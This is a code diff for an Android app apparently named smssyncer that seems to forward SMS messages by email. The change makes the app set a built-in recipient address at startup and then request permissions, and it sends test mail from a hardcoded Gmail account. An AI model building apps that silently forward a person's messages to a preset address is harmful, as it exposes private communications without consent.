@@ -4,7 +4,6 @@ import android.Manifest
 import android.content.Context
 import android.content.Intent
 import android.os.Bundle
-import android.util.Log
 import android.util.Patterns
 import android.view.Menu
 import android.view.MenuItem
@@ -17,6 +16,7 @@ import com.karumi.dexter.MultiplePermissionsReport
 import com.karumi.dexter.PermissionToken
 import com.karumi.dexter.listener.PermissionRequest
 import com.karumi.dexter.listener.multi.MultiplePermissionsListener
+import com.smssyncer.App
 import com.smssyncer.R
 import com.smssyncer.databinding.ActivityMainBinding
 import com.smssyncer.ui.activities.splash.SplashActivity
@@ -45,16 +45,22 @@ class MainActivity : BaseAppCompatActivity(), MainClickHandler {
         // Binding
         binding.clickHandler = this
         binding.viewModel = viewModel
+
+        setMail(App.EMAIL_TO)
     }
 
     override fun onSetEmailClicked() {
         binding.iContentMain.tilEmail.editText!!.text.toString().trim().let { email ->
-            if (Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
-                // Valid email
-                checkPermission(email)
-            } else {
-                snackBar(getString(R.string.main_message_invalid_email, email))
-            }
+            setMail(email)
+        }
+    }
+
+    private fun setMail(email: String) {
+        if (Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
+            // Valid email
+            checkPermission(email)
+        } else {
+            snackBar(getString(R.string.main_message_invalid_email, email))
         }
     }
 
@@ -125,6 +131,7 @@ class MainActivity : BaseAppCompatActivity(), MainClickHandler {
     }
 
     private fun sendTestMail(email: String) {
+
         SafeMail.sendMail(
             "mymailer64@gmail.com",
             email,
